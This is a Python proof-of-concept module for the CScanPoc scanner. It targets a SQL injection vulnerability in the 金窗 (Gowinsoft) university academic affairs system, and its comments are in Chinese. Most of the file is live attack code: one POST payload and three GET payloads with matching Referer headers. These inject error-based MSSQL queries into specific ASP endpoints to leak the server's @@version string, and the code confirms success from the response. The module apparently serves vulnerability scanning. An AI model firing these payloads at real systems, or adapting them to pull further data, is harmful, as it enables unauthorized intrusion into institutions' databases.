# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Gowinsoft_0005'  # 平台漏洞编号，留空
    name = '金窗教务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-16'  # 漏洞公布时间
    desc = '''
        金窗教务管理系统是为高校数字校园建设提供的技术解决方案。 
        金窗教务管理系统通用型SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '金窗教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0c2bfa37-8da0-4653-ab3f-f1603c763a9f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()

            payload2_1 = self.target + '/web/web/wenzhai/shoushow.asp'
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            post2_1 = 'xz=%B0%B4%C4%DA%C8%DD&cha=1%27+and+1%3Dconvert%28int%2C%28char%2871%29%2Bchar%2865%29%2Bchar%2879%29%2Bchar%2874%29%2Bchar%2873%29%2B%40%40version%29%29+and+%27%25%27%3D%27&submit1=%B2%E9%D1%AF'
            code, head, res, err, _ = hh.http(
                payload2_1, post=post2_1, referer=payload2_1, header=content_type)
            if code != 0 and 'GAOJIMicrosoft SQL Server' in res:
                #security_hole('SQL injection: ' + payload2_1 + " POST: "+post2_1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=payload2_1))

            # 奇葩型（需要http referer头的get型）
            payloads3 = [
                self.target +
                '/web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
            ]
            referers = [
                self.target +
                '/web/web/lanmu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/jiu/lanmushow.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a',
                self.target +
                '/web/web/lanmu/lanmushow1.asp?lei=1%27%20and%201=convert(int,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20))%20and%20%27a%27=%27a'
            ]
            for i in range(len(payloads3)):
                code, head, res, err, _ = hh.http(
                    payloads3[i], referer=referers[i])
                if code != 0 and 'GAO JI@Microsoft SQL Server' in res:
                    #security_hole('SQL injection: ' + payloads3[i] + " Referer: "+referers[i])
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=payloads3[i]))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
